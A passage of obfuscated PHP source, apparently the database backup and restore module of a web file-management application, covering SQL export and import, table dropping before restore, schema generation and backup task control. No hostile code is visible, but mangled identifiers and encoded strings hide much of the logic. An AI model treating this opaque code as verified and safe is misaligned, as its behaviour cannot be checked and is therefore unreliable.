($ÙÅÎ¼øâ) { $ÜêäÜ‚Ë->task[$ÜÆØÉı†[794]] += 1; } $˜¡ŒÀ·Ä->execute($í™®úêÒ); if ($ÙÅÎ¼øâ) { preg_match($ÜÆØÉı†[1076], $í™®úêÒ, $Êü²«şú); $ÜêäÜ‚Ë->task[$ÜÆØÉı†[1077]] = $Êü²«şú[1]; $ÜêäÜ‚Ë->update(1); } } } public function insertTable($ÍŠÃÊœ­, &$³ ûûÊµ) { $ÎïŸ›øÓ =& $_SERVER[şÒÁøÒÄ]; $ê–›‚–¬ = $this->model()->db(); $æºİ‹Ü = $€œ©ì×ò ? array($€œ©ì×ò) : $ê–›‚–¬->getTables(); foreach ($ÍŠÃÊœ­ as $ì°£¡Øç) { $€œ©ì×ò = basename($ì°£¡Øç, $ÎïŸ›øÓ[796]); if (!in_array($€œ©ì×ò, $æºİ‹Ü)) { continue; } $³ ûûÊµ->task[$ÎïŸ›øÓ[1077]] = $€œ©ì×ò; if (get_filesize($ì°£¡Øç) == 0) { continue; } $ÂŞ¨¨Ğ = $this->sqlToDb($ì°£¡Øç, $³ ûûÊµ); if (!$ÂŞ¨¨Ğ) { ActionCall($ÎïŸ›øÓ[1073], !0, 0); show_json(LNG($ÎïŸ›øÓ[1078]) . "\133{$€œ©ì×ò}\135", !1); } } } public function sqlFromDb($Ş¤¼Éı¢, $¯ŒØ§óó, &$£¶Õõ±ô, $øëÔğ÷Â = '') { if ($£¶Õõ±ô) { $£¶Õõ±ô->task[$_SERVER[şÒÁøÒÄ][1077]] = $Ş¤¼Éı¢; } $¢õäÊù¡ = $this->model($Ş¤¼Éı¢); $ˆÑ£İê = 0; $á·¥ª´ô = 0; $Ó¨Ÿ’ = 10000; $Æ›ÅÏ÷ = fopen($¯ŒØ§óó, $_SERVER[şÒÁøÒÄ][1079]); $¯»¢íŞ = $¢õäÊù¡->getPk(); $é¦ÌœŒ¨ = $¢õäÊù¡->getDbFields(); $˜·¼ºãÈ = $_SERVER[şÒÁøÒÄ][12]; if ($GLOBALS[$_SERVER[şÒÁøÒÄ][795]] && in_array($Ş¤¼Éı¢, array($_SERVER[şÒÁøÒÄ][1080], $_SERVER[şÒÁøÒÄ][1081]))) { $˜·¼ºãÈ = $Ş¤¼Éı¢; } do { $§ıÍ¿üÜ = array($¯»¢íŞ => array($_SERVER[şÒÁøÒÄ][1027], $á·¥ª´ô)); $ıˆüÇ§Ÿ = $¢õäÊù¡->where($§ıÍ¿üÜ)->field($é¦ÌœŒ¨)->order($¯»¢íŞ . $_SERVER[şÒÁøÒÄ][1082])->limit($Ó¨Ÿ’)->select(); $ıˆüÇ§Ÿ = !empty($ıˆüÇ§Ÿ) ? $ıˆüÇ§Ÿ : array(); if (!($ÚÀ­Ğõ’ = count($ıˆüÇ§Ÿ))) { break; } $Ìäó¹÷ˆ = end($ıˆüÇ§Ÿ); $á·¥ª´ô = $Ìäó¹÷ˆ[$¯»¢íŞ]; $ıÕœ´Ã = array(); foreach ($ıˆüÇ§Ÿ as $—¤ºáŸŒ) { if ($˜·¼ºãÈ) { if ($Ş¤¼Éı¢ == $_SERVER[şÒÁøÒÄ][1080]) { if ($—¤ºáŸŒ[$_SERVER[şÒÁøÒÄ][33]] == $_SERVER[şÒÁøÒÄ][1083]) { $Åãå­•È = json_decode($—¤ºáŸŒ[$_SERVER[şÒÁøÒÄ][374]], !0); if ($Åãå­•È[$_SERVER[şÒÁøÒÄ][32]] == $GLOBALS[$_SERVER[şÒÁøÒÄ][795]] && $Åãå­•È[$_SERVER[şÒÁøÒÄ][757]] != 1) { continue; } } } else { if ($—¤ºáŸŒ[$_SERVER[şÒÁøÒÄ][33]] == $_SERVER[şÒÁøÒÄ][1084] && $—¤ºáŸŒ[$_SERVER[şÒÁøÒÄ][94]] == $_SERVER[şÒÁøÒÄ][787]) { continue; } } } if ($øëÔğ÷Â) { $—¤ºáŸŒ[$_SERVER[şÒÁøÒÄ][84]] = "\173\x69\157\72{$øëÔğ÷Â}\175" . substr($—¤ºáŸŒ[$_SERVER[şÒÁøÒÄ][84]], strlen("\x7b\x69\157\72{$—¤ºáŸŒ[$_SERVER[şÒÁøÒÄ][825]]}\x7d")); $—¤ºáŸŒ[$_SERVER[şÒÁøÒÄ][825]] = $øëÔğ÷Â; } $ıÕœ´Ã[] = $_SERVER[şÒÁøÒÄ][1085] . $this->sqlEncode($—¤ºáŸŒ) . $_SERVER[şÒÁøÒÄ][1086]; } $ß£ä¼Ìè = "\x49\116\123\105\x52\124\x20\111\116\x54\117\40\140{$Ş¤¼Éı¢}\x60\40\x28\x60" . implode($_SERVER[şÒÁøÒÄ][1087], $é¦ÌœŒ¨) . $_SERVER[şÒÁøÒÄ][1088]; fwrite($Æ›ÅÏ÷, $ß£ä¼Ìè . implode($_SERVER[şÒÁøÒÄ][1089], $ıÕœ´Ã) . $_SERVER[şÒÁøÒÄ][71] . PHP_EOL); $ˆÑ£İê += $ÚÀ­Ğõ’; if ($£¶Õõ±ô) { $£¶Õõ±ô->update($ÚÀ­Ğõ’); } } while ($Ó¨Ÿ’ == $ÚÀ­Ğõ’); fclose($Æ›ÅÏ÷); return $ˆÑ£İê; } public function sqlToDb($Å„İãæ¶, &$”Ë–î) { $˜æãÃúÆ =& $_SERVER[şÒÁøÒÄ]; $æú®Ïµã = $this->model()->db(); $·‰Ÿ¤®§ = @fopen($Å„İãæ¶, $˜æãÃúÆ[1090]); if (!$·‰Ÿ¤®§) { return !1; } $ÑäÑğÉŞ = 0; $ï¹Ù®‰ò = $˜æãÃúÆ[12]; $ÎÚš«¼ = array(); $àÏ‚ÛÆ = $this->dbType(); $ºò·ÍÇ½ = $àÏ‚ÛÆ == $˜æãÃúÆ[13] ? 500 : 2000; $­š·ı = basename($Å„İãæ¶, $˜æãÃúÆ[796]); $åı —„© = 0; $¼’ß÷ó¡ = 4194304 - 104858; $í¬‰Æ›ş = 1000000 - 104858; while (!feof($·‰Ÿ¤®§)) { $†ğÕ¯ò¾ = trim(fgets($·‰Ÿ¤®§)); if (!$†ğÕ¯ò¾) { continue; } $•àáíãè = $this->sqlDecode($†ğÕ¯ò¾, $àÏ‚ÛÆ, $­š·ı); if (stripos($•àáíãè, $˜æãÃúÆ[355]) === 0) { if (!$ï¹Ù®‰ò) { $ï¹Ù®‰ò = $•àáíãè . $˜æãÃúÆ[53]; } continue; } if ($”Ë–î) { $”Ë–î->task[$˜æãÃúÆ[794]] += 1; } $ÑäÑğÉŞ++; $ÎÚš«¼[] = rtrim(rtrim(trim($•àáíãè), $˜æãÃúÆ[50]), $˜æãÃúÆ[71]); $ş‘Ğ¶‚ı = null; $˜ïóŒºô = strlen($•àáíãè); $åı —„© += $˜ïóŒºô; if ($åı —„© >= ($ºò·ÍÇ½ == 500 ? $í¬‰Æ›ş : $¼’ß÷ó¡)) { $ş‘Ğ¶‚ı = array_pop($ÎÚš«¼); if ($ÑäÑğÉŞ > 1) { $ÑäÑğÉŞ--; } } if ($ÑäÑğÉŞ >= $ºò·ÍÇ½ || $ş‘Ğ¶‚ı) { $•àáíãè = $ï¹Ù®‰ò . implode($˜æãÃúÆ[50], $ÎÚš«¼); if (!$æú®Ïµã->execute($•àáíãè)) { return !1; } if ($”Ë–î) { $”Ë–î->update($ÑäÑğÉŞ); } $ÎÚš«¼ = array(); $ÑäÑğÉŞ = 0; $åı —„© = 0; if ($ş‘Ğ¶‚ı) { $ÎÚš«¼ = array($ş‘Ğ¶‚ı); $ÑäÑğÉŞ = 1; $åı —„© = $˜ïóŒºô; } } } fclose($·‰Ÿ¤®§); if (!empty($ÎÚš«¼)) { $•àáíãè = $ï¹Ù®‰ò . implode($˜æãÃúÆ[50], $ÎÚš«¼); if (!$æú®Ïµã->execute($•àáíãè)) { return !1; } if ($”Ë–î) { $”Ë–î->update($ÑäÑğÉŞ); } } return !0; } public function dropTable($Õ£Ê×­ = null) { $Ùƒ•µİÂ = $this->model()->db(); $¦×Æå³æ = $Õ£Ê×­ ? array($Õ£Ê×­) : $Ùƒ•µİÂ->getTables(); if (!$¦×Æå³æ) { return; } foreach ($¦×Æå³æ as $Õ£Ê×­) { if ($Õ£Ê×­) { $Õ£Ê×­ = strtolower($Õ£Ê×­); } else { continue; } $Ùƒ•µİÂ->execute("\144\162\x6f\160\x20\164\x61\142\154\x65\40\x69\x66\x20\x65\x78\x69\163\x74\163\40\x60{$Õ£Ê×­}\x60"); } } private function sqlEncode($åŠ”·µ¡) { $ÃûèÁ™‰ =& $_SERVER[şÒÁøÒÄ]; $Çßåù¦ = array(); foreach ($åŠ”·µ¡ as $ÇÚµèŒ) { if (is_array($ÇÚµèŒ)) { $ÇÚµèŒ = json_encode_force($ÇÚµèŒ); } $ÇÚµèŒ = addslashes($ÇÚµèŒ); $ÇÚµèŒ = str_replace(array($ÃûèÁ™‰[1091], $ÃûèÁ™‰[231]), array($ÃûèÁ™‰[1092], $ÃûèÁ™‰[1093]), $ÇÚµèŒ); $Çßåù¦[] = str_replace($ÃûèÁ™‰[58], $ÃûèÁ™‰[1094], $ÇÚµèŒ); } return $ÃûèÁ™‰[58] . implode($ÃûèÁ™‰[1095], $Çßåù¦) . $ÃûèÁ™‰[58]; } private function sqlDecode($òÅìëûà, $åşÔ°é, $¡½ÂÎàó = '') { $›—…¢² =& $_SERVER[şÒÁøÒÄ]; $òÅìëûà = str_replace(array($›—…¢²[1092], $›—…¢²[1093]), array($›—…¢²[1091], $›—…¢²[231]), $òÅìëûà); if ($åşÔ°é == $›—…¢²[13]) { return $¡½ÂÎàó != $›—…¢²[1096] ? stripslashes($òÅìëûà) : $òÅìëûà; } if ($¡½ÂÎàó == $›—…¢²[1096]) { $òÅìëûà = str_replace($›—…¢²[1097], $›—…¢²[118], stripslashes($òÅìëûà)); } return $òÅìëûà; } public function getSqlFile($ØëšÅòæ = '') { $‰È–ì  =& $_SERVER[şÒÁøÒÄ]; $¶ŸºñŒ… = $this->dbType(!0); $¯âË ºƒ = CONTROLLER_DIR . "\x69\x6e\x73\x74\141\x6c\154\57\144\141\x74\x61\57{$¶ŸºñŒ…}\56\x73\x71\x6c"; $İŸ°ğİ‚ = file_get_contents($¯âË ºƒ); $§²ÕğÙ… = $‰È–ì [1098] . ($¶ŸºñŒ… == $‰È–ì [812] ? $‰È–ì [1099] : $‰È–ì [1100]) . $‰È–ì [1101]; preg_match_all($§²ÕğÙ…, $İŸ°ğİ‚, $”ûü‹±); $ú‹ÁÏ¥ø = $”ûü‹±[1]; $Ôß©ïŒ = $this->model()->db(); $­äÑª€û = $Ôß©ïŒ->getTables(); $ÑÔâÕ˜³ = TEMP_FILES . $‰È–ì [1102] . date($‰È–ì [758]) . $‰È–ì [8]; del_dir($ÑÔâÕ˜³); mk_dir($ÑÔâÕ˜³); $æ„”ÀáŸ = $ÑÔâÕ˜³ . $‰È–ì [1103]; $ÍÓêıÊ• = $ÑÔâÕ˜³ . $‰È–ì [1104]; $ë’Æò í = $¶ŸºñŒ… == $‰È–ì [13] ? $‰È–ì [812] : $‰È–ì [13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\x74\x61\x6c\154\57\144\141\x74\141\x2f{$ë’Æò í}\56\x73\x71\x6c", $ÑÔâÕ˜³); @touch($ÑÔâÕ˜³ . $¶ŸºñŒ… . $‰È–ì [796]); $ö¦ÑäÆ© = fopen($æ„”ÀáŸ, $‰È–ì [1079]); $¿Ô§´Õƒ = fopen($ÍÓêıÊ•, $‰È–ì [1079]); if ($¶ŸºñŒ… == $‰È–ì [13]) { $­äÑª€û = array_diff($­äÑª€û, array($‰È–ì [792], $‰È–ì [793])); $şÁ§İª‘ = array($‰È–ì [1105], $‰È–ì [1106], $‰È–ì [1107]); fwrite($¿Ô§´Õƒ, implode(PHP_EOL, $şÁ§İª‘) . PHP_EOL . PHP_EOL); foreach ($­äÑª€û as $‹ñÀœ) { $ë–óÙéÃ = $this->sqlFromSqlite($‹ñÀœ); if (!$ë–óÙéÃ[$‰È–ì [13]]) { continue; } fwrite($¿Ô§´Õƒ, $ë–óÙéÃ[$‰È–ì [13]] . PHP_EOL . PHP_EOL); if (!in_array($‹ñÀœ, $ú‹ÁÏ¥ø)) { fwrite($ö¦ÑäÆ©, $ë–óÙéÃ[$‰È–ì [812]] . PHP_EOL . PHP_EOL); } } } else { foreach ($­äÑª€û as $‹ñÀœ) { $ë–óÙéÃ = $this->sqlFromMysql($‹ñÀœ); if (!$ë–óÙéÃ[$‰È–ì [812]]) { continue; } fwrite($ö¦ÑäÆ©, $ë–óÙéÃ[$‰È–ì [812]] . PHP_EOL . PHP_EOL); if (!in_array($‹ñÀœ, $ú‹ÁÏ¥ø)) { fwrite($¿Ô§´Õƒ, $ë–óÙéÃ[$‰È–ì [13]] . PHP_EOL . PHP_EOL); } } } fclose($ö¦ÑäÆ©); fclose($¿Ô§´Õƒ); $İŸ°ğİ‚ = array($‰È–ì [812] => $æ„”ÀáŸ, $‰È–ì [13] => $ÍÓêıÊ•); return $ØëšÅòæ ? $İŸ°ğİ‚[$ØëšÅòæ] : $İŸ°ğİ‚; } public function dbType($Ù‘Ø¢Á£ = false) { $¨«ŠˆÌ =& $_SERVER[şÒÁøÒÄ]; $Ôáê÷ĞŸ = $Ù‘Ø¢Á£ ? $GLOBALS[$¨«ŠˆÌ[6]][$¨«ŠˆÌ[21]] : $this->database; $Ôáê÷ĞŸ = array_change_key_case($Ôáê÷ĞŸ); $æ’°ä¶ = $Ôáê÷ĞŸ[$¨«ŠˆÌ[980]]; if ($æ’°ä¶ == $¨«ŠˆÌ[977]) { $ı¦äñèÉ = explode($¨«ŠˆÌ[4], $Ôáê÷ĞŸ[$¨«ŠˆÌ[986]]); $æ’°ä¶ = $ı¦äñèÉ[0]; } $›ù™´ğà = array($¨«ŠˆÌ[1108] => $¨«ŠˆÌ[13], $¨«ŠˆÌ[925] => $¨«ŠˆÌ[812]); if (isset($›ù™´ğà[$æ’°ä¶])) { $æ’°ä¶ = $›ù™´ğà[$æ’°ä¶]; } return $æ’°ä¶; } public function sqlFromMysql($ìåÓö, $áÚ˜û = '') { $ßèƒæ—İ =& $_SERVER[şÒÁøÒÄ]; $’’Ò©¿ = $this->model()->db(); $òÅ¾õã = $’’Ò©¿->query($ßèƒæ—İ[1109] . $ìåÓö . $ßèƒæ—İ[385]); if (!$òÅ¾õã || !$òÅ¾õã[0]) { return !1; } $æ›·åÛ = _get($òÅ¾õã[0], $ßèƒæ—İ[1110], $ßèƒæ—İ[12]); if (!$æ›·åÛ) { return !1; } $»Í•Ùçû = "\104\x52\117\120\x20\x54\x41\x42\x4c\105\x20\111\x46\40\x45\x58\111\x53\124\x53\40\140{$ìåÓö}\x60\x3b" . PHP_EOL . $æ›·åÛ . $ßèƒæ—İ[71]; if ($áÚ˜û && $áÚ˜û == $ßèƒæ—İ[812]) { return $»Í•Ùçû; } $ƒÙüœËï = array_change_key_case($GLOBALS[$ßèƒæ—İ[6]][$ßèƒæ—İ[21]]); $…§ßÈÓû = $ƒÙüœËï[$ßèƒæ—İ[985]]; $»¤ïµÄä = $ßèƒæ—İ[1111] . $…§ßÈÓû . $ßèƒæ—İ[1112] . $ìåÓö . $ßèƒæ—İ[58]; $©¹—¦é¸ = $ßèƒæ—İ[1113] . $ìåÓö . $ßèƒæ—İ[913]; $£ŠıÇ¿¡ = $’’Ò©¿->query($»¤ïµÄä); if (empty($£ŠıÇ¿¡)) { $…şò…ÜÑ = array($ßèƒæ—İ[812] => $ßèƒæ—İ[12], $ßèƒæ—İ[13] => $ßèƒæ—İ[12]); return $áÚ˜û ? $…şò…ÜÑ[$áÚ˜û] : $…şò…ÜÑ; } $àïå‘ = $’’Ò©¿->query($©¹—¦é¸); $›ÚŸØÒ = $ßèƒæ—İ[12]; $æëÅø™… = array(); foreach ($àïå‘ as $öŠ®²İö) { if (!$›ÚŸØÒ && $öŠ®²İö[$ßèƒæ—İ[1114]] == $ßèƒæ—İ[1115]) { $›ÚŸØÒ = $öŠ®²İö[$ßèƒæ—İ[1116]]; } if (isset($æëÅø™…[$öŠ®²İö[$ßèƒæ—İ[1114]]])) { $æëÅø™…[$öŠ®²İö[$ßèƒæ—İ[1114]]][$ßèƒæ—İ[1117]][] = $öŠ®²İö[$ßèƒæ—İ[1116]]; continue; } $æëÅø™…[$öŠ®²İö[$ßèƒæ—İ[1114]]] = array($ßèƒæ—İ[1118] => $öŠ®²İö[$ßèƒæ—İ[1114]], $ßèƒæ—İ[1117] => array($öŠ®²İö[$ßèƒæ—İ[1116]]), $ßèƒæ—İ[1119] => $öŠ®²İö[$ßèƒæ—İ[1120]] == $ßèƒæ—İ[88] ? 0 : 1); } $Øô–ŸÊ‚ = array(); foreach ($æëÅø™… as $öŠ®²İö) { $Å¨õæ†° = $öŠ®²İö[$ßèƒæ—İ[1118]] == $ßèƒæ—İ[1115]; $£ŒÆø× = array($ßèƒæ—İ[1121], $öŠ®²İö[$ßèƒæ—İ[1119]] == $ßèƒæ—İ[88] && !$Å¨õæ†° ? $ßèƒæ—İ[1122] : $ßèƒæ—İ[12], $ßèƒæ—İ[1123], $ßèƒæ—İ[1124] . $ìåÓö . $ßèƒæ—İ[11] . ($Å¨õæ†° ? $ßèƒæ—İ[1125] : $öŠ®²İö[$ßèƒæ—İ[1118]]) . $ßèƒæ—İ[118], $ßèƒæ—İ[1126], $ßèƒæ—İ[118] . $ìåÓö . $ßèƒæ—İ[118], $ßèƒæ—İ[1127] . implode($ßèƒæ—İ[1128], $öŠ®²İö[$ßèƒæ—İ[1117]]) . $ßèƒæ—İ[1129]); $Øô–ŸÊ‚[] = implode($ßèƒæ—İ[53], $£ŒÆø×) . $ßèƒæ—İ[71]; } $÷…¨ÁªÃ = array(); $¥ØóåÈ = array($ßèƒæ—İ[1130] => $ßèƒæ—İ[1131], $ßèƒæ—İ[1131] => $ßèƒæ—İ[1131], $ßèƒæ—İ[288] => $ßèƒæ—İ[315], $ßèƒæ—İ[287] => $ßèƒæ—İ[315]); foreach ($£ŠıÇ¿¡ as $öŠ®²İö) { $£ŒÆø× = array($ßèƒæ—İ[118] . $öŠ®²İö[$ßèƒæ—İ[1132]] . $ßèƒæ—İ[118], isset($¥ØóåÈ[$öŠ®²İö[$ßèƒæ—İ[1133]]]) ? $¥ØóåÈ[$öŠ®²İö[$ßèƒæ—İ[1133]]] : $öŠ®²İö[$ßèƒæ—İ[1134]], $öŠ®²İö[$ßèƒæ—İ[1135]] == $ßèƒæ—İ[911] ? $ßèƒæ—İ[1136] : $ßèƒæ—İ[1137], $öŠ®²İö[$ßèƒæ—İ[1132]] == $›ÚŸØÒ ? $ßèƒæ—İ[1138] : $ßèƒæ—İ[12], $öŠ®²İö[$ßèƒæ—İ[962]] ? strtoupper(str_replace($ßèƒæ—İ[11], $ßèƒæ—İ[12], $öŠ®²İö[$ßèƒæ—İ[962]])) : $ßèƒæ—İ[12]); $÷…¨ÁªÃ[] = trim(implode($ßèƒæ—İ[53], $£ŒÆø×)); } $ôóöéß‘ = array($ßèƒæ—İ[1139] . $ìåÓö . $ßèƒæ—İ[1140], $ßèƒæ—İ[1141] . $ìåÓö . $ßèƒæ—İ[1142], implode($ßèƒæ—İ[50] . PHP_EOL, $÷…¨ÁªÃ), $ßèƒæ—İ[959]); $äéæĞâ© = implode(PHP_EOL, array_merge($ôóöéß‘, $Øô–ŸÊ‚)); if ($áÚ˜û && $áÚ˜û == $ßèƒæ—İ[13]) { return $äéæĞâ©; } $…şò…ÜÑ = array($ßèƒæ—İ[812] => $»Í•Ùçû, $ßèƒæ—İ[13] => $äéæĞâ©); return $áÚ˜û ? $…şò…ÜÑ[$áÚ˜û] : $…şò…ÜÑ; } public function sqlFromSqlite($Éò®Ò»½, $‡Ö¾©ã = '') { $ıÃ¶«¾ =& $_SERVER[şÒÁøÒÄ]; $È‡®úòñ = $this->model()->db(); $£ğÏëÇå = "\120\122\x41\x47\x4d\101\x20\x54\x41\102\114\105\137\111\x4e\106\x4f\40\50\x27{$Éò®Ò»½}\47\x29"; $‡‹†‹¶‰ = "\123\105\x4c\x45\x43\124\x20\x2a\x20\x46\122\117\x4d\40\x73\x71\x6c\x69\x74\x65\137\x6d\141\163\x74\145\x72\x20\x57\x48\105\122\x45\x20\164\142\x6c\137\156\x61\x6d\145\x20\x3d\40\47{$Éò®Ò»½}\47"; $Ìã£¦¤È = $È‡®úòñ->query($£ğÏëÇå); if (empty($Ìã£¦¤È)) { $Š–ïóî = array($ıÃ¶«¾[812] => $ıÃ¶«¾[12], $ıÃ¶«¾[13] => $ıÃ¶«¾[12]); return $‡Ö¾©ã ? $Š–ïóî[$‡Ö¾©ã] : $Š–ïóî; } $±°îËì€ = $È‡®úòñ->query($‡‹†‹¶‰); $£ûö¨ô˜ = $™Çó÷„Ø = array(); foreach ($±°îËì€ as $©Ú¡Ÿ•) { if ($©Ú¡Ÿ•[$ıÃ¶«¾[33]] == $ıÃ¶«¾[279]) { $£ûö¨ô˜[] = $©Ú¡Ÿ•[$ıÃ¶«¾[1143]]; } else { $™Çó÷„Ø[$©Ú¡Ÿ•[$ıÃ¶«¾[32]]] = $©Ú¡Ÿ•[$ıÃ¶«¾[1143]]; } } $Â”äæÓµ = array_merge(array($ıÃ¶«¾[1139] . $Éò®Ò»½ . $ıÃ¶«¾[118]), $£ûö¨ô˜, array_values($™Çó÷„Ø)); $Â”äæÓµ = implode($ıÃ¶«¾[71] . PHP_EOL, $Â”äæÓµ) . $ıÃ¶«¾[71]; if ($‡Ö¾©ã && $‡Ö¾©ã == $ıÃ¶«¾[13]) { return $Â”äæÓµ; } $ë€áö©° = array(); $ÑİÀ¯ = array($ıÃ¶«¾[1131] => $ıÃ¶«¾[1144], $ıÃ¶«¾[315] => $ıÃ¶«¾[1145]); $ø¯±Í¥ = $ıÃ¶«¾[12]; foreach ($Ìã£¦¤È as $©Ú¡Ÿ•) { if ($©Ú¡Ÿ•[$ıÃ¶«¾[57]] == $ıÃ¶«¾[88]) { $ø¯±Í¥ = $©Ú¡Ÿ•[$ıÃ¶«¾[32]]; } $‹àöÖ‚ = array($ıÃ¶«¾[385] . $©Ú¡Ÿ•[$ıÃ¶«¾[32]] . $ıÃ¶«¾[385], isset($ÑİÀ¯[$©Ú¡Ÿ•[$ıÃ¶«¾[33]]]) ? $ÑİÀ¯[$©Ú¡Ÿ•[$ıÃ¶«¾[33]]] : $©Ú¡Ÿ•[$ıÃ¶«¾[33]], $©Ú¡Ÿ•[$ıÃ¶«¾[35]] == $ıÃ¶«¾[88] ? $ıÃ¶«¾[1136] : $ıÃ¶«¾[1146] . $©Ú¡Ÿ•[$ıÃ¶«¾[56]], $©Ú¡Ÿ•[$ıÃ¶«¾[57]] == $ıÃ¶«¾[88] ? $ıÃ¶«¾[1147] : $ıÃ¶«¾[12]); $ë€áö©°[] = trim(implode($ıÃ¶«¾[53], $‹àöÖ‚)); } foreach ($™Çó÷„Ø as $Ö—Ô ş => $ÉæšçªÔ) { $Óå†¡Ñ = str_replace($ıÃ¶«¾[1148] . $Éò®Ò»½ . $ıÃ¶«¾[11], $ıÃ¶«¾[12], $Ö—Ô ş); $©¹ÈÚİ° = str_replace(array($ıÃ¶«¾[118], $ıÃ¶«¾[970]), $ıÃ¶«¾[385], substr($ÉæšçªÔ, stripos($ÉæšçªÔ, $ıÃ¶«¾[260]))); if ($Óå†¡Ñ == $ıÃ¶«¾[1125]) { $ÉÙìÕ¿Õ = $ıÃ¶«¾[1149] . $ø¯±Í¥ . $ıÃ¶«¾[1150]; } else { $ÉÙìÕ¿Õ = (stripos($Óå†¡Ñ, $ıÃ¶«¾[11]) ? $ıÃ¶«¾[1151] : $ıÃ¶«¾[12]) . ($ıÃ¶«¾[1152] . $Óå†¡Ñ . $ıÃ¶«¾[1153] . $©¹ÈÚİ°); } $ë€áö©°[] = $ÉÙìÕ¿Õ; } $®‹³àÒƒ = array($ıÃ¶«¾[1154] . $Éò®Ò»½ . $ıÃ¶«¾[1155], $ıÃ¶«¾[1156] . $Éò®Ò»½ . $ıÃ¶«¾[1157], implode($ıÃ¶«¾[50] . PHP_EOL, $ë€áö©°), $ıÃ¶«¾[1158]); $áÊıèğ = implode(PHP_EOL, $®‹³àÒƒ); if ($‡Ö¾©ã && $‡Ö¾©ã == $ıÃ¶«¾[812]) { return $áÊıèğ; } $Š–ïóî = array($ıÃ¶«¾[812] => $áÊıèğ, $ıÃ¶«¾[13] => $Â”äæÓµ); return $‡Ö¾©ã ? $Š–ïóî[$‡Ö¾©ã] : $Š–ïóî; } } goto bĞĞÎš ¹Æ; fÙˆöÜ…: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\142\x61\143\153\165\x70\x4c\x69\163\x74"; public $field = array("\151\157", "\156\x61\155\145", "\163\x74\141\164\165\163", "\143\x6f\x6e\164\x65\156\164", "\155\141\x6e\165\x61\x6c", "\162\145\163\165\x6c\164", "\164\x69\x6d\x65\106\x72\157\155", "\x74\x69\x6d\x65\x54\157"); public function config() { $ñŠóŞä€ =& $_SERVER[şÒÁøÒÄ]; $úô¥¿áğ = Model($ñŠóŞä€[778])->get($ñŠóŞä€[788]); $úô¥¿áğ = json_decode($úô¥¿áğ, !0); $úô¥¿áğ = is_array($úô¥¿áğ) ? $úô¥¿áğ : array(); if (!isset($úô¥¿áğ[$ñŠóŞä€[762]])) { $úô¥¿áğ[$ñŠóŞä€[762]] = $ñŠóŞä€[88]; } unset($úô¥¿áğ[$ñŠóŞä€[1650]]); Action($ñŠóŞä€[1894])->taskInit(); Model($ñŠóŞä€[1649])->cacheClear(); $î³¯¢Ãñ = $ñŠóŞä€[1895]; $ïÔ³Ô³Û = Model($ñŠóŞä€[1896])->findByKey($ñŠóŞä€[1668], $î³¯¢Ãñ); if (!$ïÔ³Ô³Û) { $ïÔ³Ô³Û = array(); } if (isset($ïÔ³Ô³Û[$ñŠóŞä€[180]])) { $ïÔ³Ô³Û[$ñŠóŞä€[180]] = json_decode($ïÔ³Ô³Û[$ñŠóŞä€[180]], !0); } if (isset($úô¥¿áğ[$ñŠóŞä€[180]])) { $ïÔ³Ô³Û[$ñŠóŞä€[180]][$ñŠóŞä€[1653]] = $úô¥¿áğ[$ñŠóŞä€[180]]; unset($úô¥¿áğ[$ñŠóŞä€[180]]); } return array_merge($ïÔ³Ô³Û, $úô¥¿áğ); } public function listData($¡ÒÂœ²û = false, $ˆ–ñÎ»´ = "\155\x6f\144\x69\146\x79\x54\x69\x6d\145", $¯ÑïåÃá = false) { return parent::listData($¡ÒÂœ²û, $ˆ–ñÎ»´, !0); } public function lastItem() { $ÊÅñÄÒ› = $this->listData(); return !empty($ÊÅñÄÒ›[0]) ? $ÊÅñÄÒ›[0] : null; } public function kill($ÆÙÑ›‚) { $èĞ‰†Èï =& $_SERVER[şÒÁøÒÄ]; $ıš¥õòÅ = $this->listData($ÆÙÑ›‚); if (!$ıš¥õòÅ || empty($ıš¥õòÅ[$èĞ‰†Èï[32]])) { return !0; } Task::kill($èĞ‰†Èï[787]); Task::kill($èĞ‰†Èï[808]); Task::kill($èĞ‰†Èï[817]); $ªæ¾»´· = $ıš¥õòÅ[$èĞ‰†Èï[32]]; $¡‰¶Š¹« = TEMP_FILES . $èĞ‰†Èï[786] . $ªæ¾»´· . $èĞ‰†Èï[8]; IO::remove($¡‰¶Š¹«, !1); return $this->remove($ÆÙÑ›‚); } public function remove($œÊš¡‰‘) { $± ±«œÎ = $this->listData($œÊš¡‰‘); if (!$± ±«œÎ) { return !0; } return $this->backupRemove($± ±«œÎ); } private function backupRemove($˜àËÄú) { parent::remove($˜àËÄú[$_SERVER[şÒÁøÒÄ][399]]); $¼ ©íß™ = $this->backupPath($˜àËÄú); IO::remove($¼ ©íß™, !1); return !0; } private function backupPath($£Ã“Ïœ) { $»¦öé£ =& $_SERVER[şÒÁøÒÄ]; $ÚˆÂÀº = $£Ã“Ïœ[$»¦öé£[32]]; $¾ …è·˜ = Model($»¦öé£[778])->get($»¦öé£[779]); $ÂÄöä»É = substr(md5($»¦öé£[780] . $¾ …è·˜ . $ÚˆÂÀº), 0, 8); return "\173\151\157\72{$£Ã“Ïœ[$»¦öé£[759]]}\x7d\57\144\x61\164\x61\142\141\163\145\x2f\x62\x61\143\153\x75\160\x2f" . $ÚˆÂÀº . $»¦öé£[11] . $ÂÄöä»É; } public function start() { $®‹£°ÅØ =& $_SERVER[şÒÁøÒÄ]; if ($GLOBALS[$®‹£°ÅØ[6]][$®‹£°ÅØ[89]][$®‹£°ÅØ[1897]] != $®‹£°ÅØ[88]) { return !0; } $–º×»Æ = $this->config(); if (!$–º×»Æ || $–º×»Æ[$®‹£°ÅØ[1650]] != $®‹£°ÅØ[88]) { return !1; } $Œ¸Ÿøù = $this->process(); foreach ($Œ¸Ÿøù as $Ê˜£š÷ì) { if ($Ê˜£š÷ì) { return Task::restart($Ê˜£š÷ì[$®‹£°ÅØ[399]]); } } $Ê¼İÁ¦° = new Backup(); $¯‰şƒ– = $Ê¼İÁ¦°->db(); if ($¯‰şƒ–) { $¯‰şƒ– = $Ê¼İÁ¦°->dbFile(); if ($¯‰şƒ– && $–º×»Æ[$®‹£°ÅØ[762]] == $®‹£°ÅØ[198]) { $¯‰şƒ– = $Ê¼İÁ¦°->file(); } } Backup::set(array($®‹£°ÅØ[757] => 1, $®‹£°ÅØ[769] => time())); return !0; } public function process() { $½òÓ²Š½ =& $_SERVER[şÒÁøÒÄ]; $úçÖÉ²İ = array($½òÓ²Š½[765] => Task::get($½òÓ²Š½[787]), $½òÓ²Š½[770] => Task::get($½òÓ²Š½[808]), $½òÓ²Š½[200] => Task::get($½òÓ²Š½[817])); $ŒëÉ‚„ğ = !1; foreach 